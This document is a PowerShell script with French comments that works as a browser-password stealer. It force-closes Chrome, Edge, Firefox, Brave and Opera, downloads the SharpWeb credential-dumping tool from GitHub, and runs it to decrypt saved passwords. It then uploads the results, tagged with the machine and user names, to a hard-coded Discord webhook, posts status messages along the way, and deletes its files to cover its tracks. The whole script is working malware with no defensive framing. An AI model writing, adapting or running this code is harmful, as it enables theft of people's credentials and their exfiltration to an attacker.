$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord {
    param([string]$msg)
    try {
        $Body = @{content=$msg} | ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $Body -ContentType 'application/json' | Out-Null
    } catch {}
}

Send-Discord "🟢 **START** - $env:COMPUTERNAME | $env:USERNAME"

# Tuer navigateurs
Get-Process chrome,msedge,firefox,brave,opera -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 3

Set-Location $env:TEMP
Remove-Item SharpWeb.exe,passwords.txt -Force -EA 0

Send-Discord "📥 **Downloading SharpWeb...**"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    # SharpWeb - outil C# qui déchiffre VRAIMENT les mots de passe
    # Projet actif et maintenu en 2025
    $url = "https://github.com/djhohnstein/SharpWeb/releases/download/1.2/SharpWeb.exe"
    
    Invoke-WebRequest -Uri $url -OutFile "SharpWeb.exe" -UseBasicParsing
    
    if (!(Test-Path "SharpWeb.exe")) {
        Send-Discord "❌ **Download failed - trying alternative...**"
        
        # Alternative : télécharger depuis raw GitHub (compilé)
        $url2 = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpWeb.exe"
        Invoke-WebRequest -Uri $url2 -OutFile "SharpWeb.exe" -UseBasicParsing
    }
    
    if (!(Test-Path "SharpWeb.exe")) {
        Send-Discord "❌ **Both downloads failed**"
        exit
    }
    
    Send-Discord "🔓 **Extracting passwords in clear text...**"
    
    # Exécuter SharpWeb et capturer la sortie
    $output = .\SharpWeb.exe all 2>&1 | Out-String
    
    # Sauvegarder les résultats
    $output | Out-File "passwords.txt" -Encoding UTF8
    
    Start-Sleep 2
    
    if (Test-Path "passwords.txt") {
        $size = [math]::Round((Get-Item "passwords.txt").Length / 1KB, 2)
        
        # Compter les mots de passe trouvés
        $passwordCount = ([regex]::Matches($output, "Password:")).Count
        
        Send-Discord "📤 **Found $passwordCount passwords - Uploading $size KB...**"
        
        $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        curl.exe -F "file=@passwords.txt" -F "content=🔑 **PASSWORDS DECRYPTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Passwords found:** $passwordCount`n**Size:** $size KB`n**Date:** $date" $wh
        
        Send-Discord "✅ **Upload SUCCESS**"
    } else {
        Send-Discord "❌ **No output file created**"
    }
    
} catch {
    $err = $_.Exception.Message -replace '"',"'"
    Send-Discord "❌ **Error:** $err"
}

Remove-Item SharpWeb.exe,passwords.txt -Force -EA 0
Send-Discord "🧹 **FINISHED**"
